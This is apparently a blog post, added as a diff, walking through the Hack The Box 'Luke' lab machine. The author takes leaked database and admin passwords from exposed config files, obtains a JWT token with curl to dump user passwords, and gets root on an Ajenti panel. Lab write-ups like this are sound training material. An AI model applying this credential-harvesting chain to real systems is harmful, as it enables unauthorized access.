@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="en" prefix="og: https://ogp.me/ns#">
+<head>
+<meta charset="UTF-8" />
+<meta http-equiv="X-UA-Compatible"
+      content="IE=edge">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0" />
+<meta name="description"
+      content="Adventures of Functional Mediocrity" />
+<meta name="keywords"
+      content="zola, theme, ink, hugo-ink, john tuyen, jtuyen" /> 
+
+<title>John Tuyen | Luke</title>
+<meta
+  property="og:title"
+  content="John Tuyen | Luke"
+/>
+<meta property="og:type" content="website" />
+<meta property="og:url" content="https://johntuyen.com/posts/htb-luke/" />
+<meta property="og:description" content="Adventures of Functional Mediocrity" />
+<meta property="og:image" content="" />
+<meta property="og:image:url" content="" />
+<meta property="og:image:secure_url" content="" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:title" content="Luke" />
+<meta name="twitter:description" content="Adventures of Functional Mediocrity" />
+<meta property="twitter:image" content="" />
+
+<link rel="alternate"
+          type="application/rss+xml"
+          title="John Tuyen"
+          href="https://johntuyen.com/atom.xml">
+    <link rel="preconnect"
+          href="https://fonts.googleapis.com">
+    <link rel="preconnect"
+          href="https://fonts.gstatic.com"
+          crossorigin>
+    <!-- <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&family=Playfair+Display:wght@700&display=swap" rel="stylesheet">  -->
+    <link href="https://fonts.googleapis.com/css2?family=Andada+Pro&display=swap&family=Playfair+Display"
+          rel="stylesheet">
+    <link rel="stylesheet"
+          href="https://johntuyen.com/base.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/feather-icons/4.28.0/feather.min.js"
+            integrity="sha512-7x3zila4t2qNycrtZ31HO0NnJr8kg2VI67YLoRSyi9hGhRN66FHYWr7Axa9Y1J9tGYHVBPqIjSE1ogHrJTz51g=="
+            crossorigin="anonymous"></script>
+</head>
+
+<body>
+    <header>
+        <a class="site-name"
+           href="/">
+            <h1>John Tuyen</h1>
+        </a>
+        <div class="site-description">
+            <p>Adventures of Functional Mediocrity</p>
+        </div>
+        <nav>
+            <div class="links"> 
+            <a 
+                href="https://johntuyen.com/ ">About</a> 
+            <a 
+                href="https://johntuyen.com/posts/ ">Posts</a> 
+            <a 
+                href="https://johntuyen.com/gaze/ ">Gaze</a> 
+            <a 
+                href="https://johntuyen.com/wiretap/ ">Wiretap</a> 
+            <a 
+                href="https://johntuyen.com/tags/ ">Tags</a> 
+            <a 
+                href="https://johntuyen.com/search/ ">Search</a> 
+            </div>
+        </nav>
+    </header>
+    <article>
+    
+
+<section class="post">
+  <div class="post-header">
+    <div class="meta">
+      <div class="date">
+        <span class="day">14</span>
+        <span class="rest">Sep 19</span>
+      </div>
+    </div>
+
+    <div class="matter">
+      <h1 class="title">Luke </h1>
+    </div>
+  </div>
+    
+  <article><ol>
+<li>
+<p>Port scans show TCP ports 21, 22, 80, 3000, 8000 are open.</p>
+</li>
+<li>
+<p>The FTP service allows anonymous FTP access so I checked that out. It doesn't contain any useful files besides a .txt file from a user about setting up a web server access for demonstration purposes.</p>
+</li>
+<li>
+<p>The SSH service isn't useful to us right now, we just keep that in mind that we have a service that we can try it on once we enumerate the other services for credentials.</p>
+</li>
+<li>
+<p>Enumerating port 80 showed up a bootstrap page that doesn't have any useful links to administration panels or hints of what CMS it uses besides bootstrap. I began enumerating the port 80 and found this link: <a href="http://luke/config.php">http://luke/config.php</a></p>
+<pre data-lang="shell" style="background-color:#2b303b;color:#c0c5ce;" class="language-shell "><code class="language-shell" data-lang="shell"><span>$dbHost = &#39;localhost&#39;; $dbUsername = &#39;root&#39;; $dbPassword = &#39;Zk6heYCyv6ZE9Xcg&#39;; $db = &quot;login&quot;; $conn = new mysqli($dbHost, $dbUsername, $dbPassword,$db) or die(&quot;Connect failed: %s\n&quot;. $conn -&gt; error);
+</span></code></pre>
+<p>Not sure what to do with this information yet, I'll keep this aside and keep enumerating the other services.</p>
+<p>Another interesting link came up in the dirbuster searches: <a href="http://luke/package.json">http://luke/package.json</a></p>
+<p>This JSON file tells us that Bootstrap 4.1.2 is most likely installed. I'll keep this aside just in case I could search for exploits against it.</p>
+<p><img src="https://johntuyen.com/posts/htb-luke/htb-luke-packagejson.png" alt="htb-luke-packagejson" /></p>
+</li>
+<li>
+<p>Enumerating port 3000 shows it's running some sort of json service as it replies back with an HTTP request that looks like this:</p>
+<pre data-lang="shell" style="background-color:#2b303b;color:#c0c5ce;" class="language-shell "><code class="language-shell" data-lang="shell"><span>{&quot;success&quot;:false,&quot;message&quot;:&quot;Auth token is not supplied&quot;}
+</span></code></pre>
+<p>A quick Google search that this message is a JWT Token authentication service. I'll keep this aside once again and finish up my enumeration process to see the bigger picture of what this machine is about. Gobuster also showed there is a directory named <code>/login</code> and <code>/users</code>.</p>
+</li>
+<li>
+<p>Enumerating port 8000 shows it's running a platform called Ajenti. A quick Google search shows it's a platform made for managing a server. I think this is a potential entry to gain access to what I need to gain user land. I tried the basic possible login and passwords but no luck. Looking for possible exploits only shows a viable XSS exploit but requires that you need to log into Ajenti first.</p>
+</li>
+<li>
+<p>Circling back to what we have found so far, the JWT Token page must be related to generating a password I would assume.</p>
+<p>I don't know what JWT Token was until I was working on this machine. A quick Google search showed a Medium article to show you how to create a POST request to generate a token and GET request with the authorized token to obtain more information.</p>
+<p>After some trial and error, here is my working POST request to obtain the JWT Token using cURL:</p>
+<pre data-lang="shell" style="background-color:#2b303b;color:#c0c5ce;" class="language-shell "><code class="language-shell" data-lang="shell"><span>curl --header &quot;Content-Type: application/json&quot; --request POST --data &#39;{&quot;password&quot;:&quot;Zk6heYCyv6ZE9Xcg&quot;, &quot;username&quot;:&quot;admin&quot;}&#39; http://luke:3000/login
+</span></code></pre>
+<p>The server response was a success!</p>
+<pre data-lang="shell" style="background-color:#2b303b;color:#c0c5ce;" class="language-shell "><code class="language-shell" data-lang="shell"><span>{&quot;success&quot;:true,&quot;message&quot;:&quot;Authentication successful!&quot;,&quot;token&quot;:&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYxNDA1NDQxLCJleHAiOjE1NjE0OTE4NDF9.kMu4ZFovwboGK0X348oz52Fwa_YXY7tKOMoRr8LbU8Y&quot;}
+</span></code></pre>
+<p>One thing to note about the cURL command is that I had to change the username from root to admin to get a response. This isn't something I would have thought of and I got a hint from the Discord chat. Lesson learned to enumerate even these json-type services.</p>
+</li>
+<li>
+<p>Now with this JWT Token in hand, what do we do with this? It's time to craft a GET response and see what we can find out in the /users directory that we found earlier.</p>
+<pre data-lang="shell" style="background-color:#2b303b;color:#c0c5ce;" class="language-shell "><code class="language-shell" data-lang="shell"><span>curl -X GET -H &#39;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYxNDA1ODg3LCJleHAiOjE1NjE0OTIyODd9.QBBrRf7x5MPx1GkcJRQZxtShmP9az9RpRWqQyq9VHzM&#39; http://luke:3000/users
+</span></code></pre>
+<p>The server responded with my request!</p>
+<pre data-lang="shell" style="background-color:#2b303b;color:#c0c5ce;" class="language-shell "><code class="language-shell" data-lang="shell"><span>[{&quot;ID&quot;:&quot;1&quot;,&quot;name&quot;:&quot;Admin&quot;,&quot;Role&quot;:&quot;Superuser&quot;},{&quot;ID&quot;:&quot;2&quot;,&quot;name&quot;:&quot;Derry&quot;,&quot;Role&quot;:&quot;Web Admin&quot;},{&quot;ID&quot;:&quot;3&quot;,&quot;name&quot;:&quot;Yuri&quot;,&quot;Role&quot;:&quot;Beta Tester&quot;},{&quot;ID&quot;:&quot;4&quot;,&quot;name&quot;:&quot;Dory&quot;,&quot;Role&quot;:&quot;Supporter&quot;}]
+</span></code></pre>
+</li>
+<li>
+<p>This is surprising. I expected to generate a response with username and passwords but only showed username instead. If it's one thing I learned from before, even these json-type services can be enumerated further. I tried to play around with the variables in the json response and see if I get a response.</p>
+<pre data-lang="shell" style="background-color:#2b303b;color:#c0c5ce;" class="language-shell "><code class="language-shell" data-lang="shell"><span>curl -X GET -H &#39;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYxNDA1ODg3LCJleHAiOjE1NjE0OTIyODd9.QBBrRf7x5MPx1GkcJRQZxtShmP9az9RpRWqQyq9VHzM&#39; http://luke:3000/users/admin
+</span></code></pre>
+<p>And indeed I did so I proceed to enumerate all the users.</p>
+<pre data-lang="shell" style="background-color:#2b303b;color:#c0c5ce;" class="language-shell "><code class="language-shell" data-lang="shell"><span>{&quot;name&quot;:&quot;Admin&quot;,&quot;password&quot;:&quot;WX5b7)&gt;/rp$U)FW&quot;}
+</span><span>{&quot;name&quot;:&quot;Derry&quot;,&quot;password&quot;:&quot;rZ86wwLvx7jUxtch&quot;}
+</span><span>{&quot;name&quot;:&quot;Yuri&quot;,&quot;password&quot;:&quot;bet@tester87&quot;}
+</span><span>{&quot;name&quot;:&quot;Dory&quot;,&quot;password&quot;:&quot;5y:!xa=ybfe)/QD&quot;}
+</span></code></pre>
+</li>
+<li>
+<p>Now that we have username and passwords, which services will allow me to login? Seeing that I found 3 places to login so far in port 22, 80, 8000, I tried those and failed. Wondering where if I missed something in my enumeration process and indeed I did. Don't just rely on 1 tool to do all your scans as I did. I only used Gobuster for my enumeration process and I should have used dirbuster with recursive mode turned on. Once I did, it found a <code>/management</code> folder in port 80.</p>
+<p>The folder was protected by HTTP Basic Auth but was bypassed as I used Derry's login. Once logged in, there are couple of files displayed but only the <code>config.json</code> file had interesting data.</p>
+<pre data-lang="shell" style="background-color:#2b303b;color:#c0c5ce;" class="language-shell "><code class="language-shell" data-lang="shell"><span>{
+</span><span>    &quot;users&quot;: {
+</span><span>        &quot;root&quot;: {
+</span><span>            &quot;configs&quot;: {
+</span><span>                &quot;ajenti.plugins.notepad.notepad.Notepad&quot;: &quot;{\&quot;bookmarks\&quot;: [], \&quot;root\&quot;: \&quot;/\&quot;}&quot;, 
+</span><span>                &quot;ajenti.plugins.terminal.main.Terminals&quot;: &quot;{\&quot;shell\&quot;: \&quot;sh -c $SHELL || sh\&quot;}&quot;, 
+</span><span>                &quot;ajenti.plugins.elements.ipmap.ElementsIPMapper&quot;: &quot;{\&quot;users\&quot;: {}}&quot;, 
+</span><span>                &quot;ajenti.plugins.munin.client.MuninClient&quot;: &quot;{\&quot;username\&quot;: \&quot;username\&quot;, \&quot;prefix\&quot;: \&quot;http://localhost:8080/munin\&quot;, \&quot;password\&quot;: \&quot;123\&quot;}&quot;, 
+</span><span>                &quot;ajenti.plugins.dashboard.dash.Dash&quot;: &quot;{\&quot;widgets\&quot;: [{\&quot;index\&quot;: 0, \&quot;config\&quot;: null, \&quot;container\&quot;: \&quot;1\&quot;, \&quot;class\&quot;: \&quot;ajenti.plugins.sensors.memory.MemoryWidget\&quot;}, {\&quot;index\&quot;: 1, \&quot;config\&quot;: null, \&quot;container\&quot;: \&quot;1\&quot;, \&quot;class\&quot;: \&quot;ajenti.plugins.sensors.memory.SwapWidget\&quot;}, {\&quot;index\&quot;: 2, \&quot;config\&quot;: null, \&quot;container\&quot;: \&quot;1\&quot;, \&quot;class\&quot;: \&quot;ajenti.plugins.dashboard.welcome.WelcomeWidget\&quot;}, {\&quot;index\&quot;: 0, \&quot;config\&quot;: null, \&quot;container\&quot;: \&quot;0\&quot;, \&quot;class\&quot;: \&quot;ajenti.plugins.sensors.uptime.UptimeWidget\&quot;}, {\&quot;index\&quot;: 1, \&quot;config\&quot;: null, \&quot;container\&quot;: \&quot;0\&quot;, \&quot;class\&quot;: \&quot;ajenti.plugins.power.power.PowerWidget\&quot;}, {\&quot;index\&quot;: 2, \&quot;config\&quot;: null, \&quot;container\&quot;: \&quot;0\&quot;, \&quot;class\&quot;: \&quot;ajenti.plugins.sensors.cpu.CPUWidget\&quot;}]}&quot;, 
+</span><span>                &quot;ajenti.plugins.elements.shaper.main.Shaper&quot;: &quot;{\&quot;rules\&quot;: []}&quot;, 
+</span><span>                &quot;ajenti.plugins.ajenti_org.main.AjentiOrgReporter&quot;: &quot;{\&quot;key\&quot;: null}&quot;, 
+</span><span>                &quot;ajenti.plugins.logs.main.Logs&quot;: &quot;{\&quot;root\&quot;: \&quot;/var/log\&quot;}&quot;, 
+</span><span>                &quot;ajenti.plugins.mysql.api.MySQLDB&quot;: &quot;{\&quot;password\&quot;: \&quot;\&quot;, \&quot;user\&quot;: \&quot;root\&quot;, \&quot;hostname\&quot;: \&quot;localhost\&quot;}&quot;, 
+</span><span>                &quot;ajenti.plugins.fm.fm.FileManager&quot;: &quot;{\&quot;root\&quot;: \&quot;/\&quot;}&quot;, 
+</span><span>                &quot;ajenti.plugins.tasks.manager.TaskManager&quot;: &quot;{\&quot;task_definitions\&quot;: []}&quot;, 
+</span><span>                &quot;ajenti.users.UserManager&quot;: &quot;{\&quot;sync-provider\&quot;: \&quot;\&quot;}&quot;, 
+</span><span>                &quot;ajenti.usersync.adsync.ActiveDirectorySyncProvider&quot;: &quot;{\&quot;domain\&quot;: \&quot;DOMAIN\&quot;, \&quot;password\&quot;: \&quot;\&quot;, \&quot;user\&quot;: \&quot;Administrator\&quot;, \&quot;base\&quot;: \&quot;cn=Users,dc=DOMAIN\&quot;, \&quot;address\&quot;: \&quot;localhost\&quot;}&quot;, 
+</span><span>                &quot;ajenti.plugins.elements.usermgr.ElementsUserManager&quot;: &quot;{\&quot;groups\&quot;: []}&quot;, 
+</span><span>                &quot;ajenti.plugins.elements.projects.main.ElementsProjectManager&quot;: &quot;{\&quot;projects\&quot;: \&quot;KGxwMQou\\n\&quot;}&quot;
+</span><span>            }, 
+</span><span>            &quot;password&quot;: &quot;KpMasng6S5EtTy9Z&quot;, 
+</span><span>            &quot;permissions&quot;: []
+</span><span>        }
+</span><span>    }, 
+</span><span>    &quot;language&quot;: &quot;&quot;, 
+</span><span>    &quot;bind&quot;: {
+</span><span>        &quot;host&quot;: &quot;0.0.0.0&quot;, 
+</span><span>        &quot;port&quot;: 8000
+</span><span>    }, 
+</span><span>    &quot;enable_feedback&quot;: true, 
+</span><span>    &quot;ssl&quot;: {
+</span><span>        &quot;enable&quot;: false, 
+</span><span>        &quot;certificate_path&quot;: &quot;&quot;
+</span><span>    }, 
+</span><span>    &quot;authentication&quot;: true, 
+</span><span>    &quot;installation_id&quot;: 12354
+</span><span>}
+</span></code></pre>
+<p>The config.json file contains a root and password. Now what do we do with this newly obtained credentials? I tried using it on the other login panels as we found earlier again. The root credentials was succcessful on port 8000, the Ajenti platform!</p>
+</li>
+<li>
+<p>Once logged in, I was looking for a possible way to read the flag such as an editor or something. Luckily, there is a File Manager tool that we can read the user flag and even root flag. That was too easy.</p>
+</li>
+</ol>
+<p><img src="https://johntuyen.com/posts/htb-luke/htb-luke-rootfs.png" alt="htb-luke-rootfs" /></p>
+</article>
+
+  
+    
+  
+  <ul class="tags">
+    
+      <li><a href='https://johntuyen.com/tags/hackthebox'>hackthebox</a></li>
+    
+  </ul>
+  
+  
+    
+</section>
+</article>
+    <footer>
+        <div class="social">
+            <ul> 
+                 
+                <li>
+                    <a href="https://github.com/jtuyen"
+                       title="Github" rel="me"><i data-feather="github"></i></a>
+                </li>
+                 
+                 
+                <li>
+                    <a href="https://twitter.com/jtuyen"
+                       title="Twitter"
+                       rel="me"><i data-feather="twitter"></i></a>
+                </li>
+                
+                
+                
+                <li>
+                    <a href="https://johntuyen.com/johntuyenprotonmailcom-pgp.asc" title="PGP" rel="me">
+                        <i data-feather="lock"></i>
+                    </a>
+                </li>
+                
+                <li>
+                    <a href="https://johntuyen.com/atom.xml"
+                       title="John Tuyen"><i data-feather="rss"></i></a>
+                </li>
+            </ul>
+        </div>
+        <p> © John Tuyen 2024
+
+        
+        
+        </p>
+    </footer>
+    <script>
+        feather.replace();
+    </script> 
+    </body>
+</html>
